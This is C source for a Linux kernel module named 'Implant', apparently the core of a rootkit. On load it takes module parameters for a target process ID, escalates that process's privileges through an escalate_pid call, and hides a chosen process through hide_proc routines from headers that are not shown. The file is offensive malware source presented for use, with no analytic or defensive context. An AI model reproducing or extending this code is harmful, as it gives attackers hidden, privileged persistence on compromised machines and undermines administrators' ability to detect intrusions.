#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/delay.h>
#include <linux/sched.h>

#include <privilege_escalation.h>
#include "hide_proc.h"

MODULE_DESCRIPTION("Implant");
MODULE_AUTHOR("sc");
MODULE_LICENSE("GPL");

int target_pid = INVALID_PID;
char *hide_pid;
module_param(target_pid, int, S_IRUSR | S_IWUSR);
module_param(hide_pid, charp, S_IRUSR | S_IWUSR);
MODULE_PARM_DESC(target_pid, "Process ID to escalate");
MODULE_PARM_DESC(hide_pid, "Process ID to hide");

static int __init implant_init(void)
{
	int ret = 0;

	printk(KERN_INFO
	       "[CORE] - Implant loaded, given pid %d (-1 means no pid given)\n",
	       target_pid);
	if (target_pid != INVALID_PID) {
		ssleep(5);
		escalate_pid(target_pid);
	}

	ret = hide_proc_init();

	if (ret) {
		return ret;
	}

	if (hide_pid) {
		ret = hide_proc(hide_pid);
		if (ret) {
			return ret;
		}
	}

	return 0;
}

static void __exit implant_exit(void)
{
	hide_proc_exit();
	printk("Implant unloaded\n");
}

module_init(implant_init);
module_exit(implant_exit);
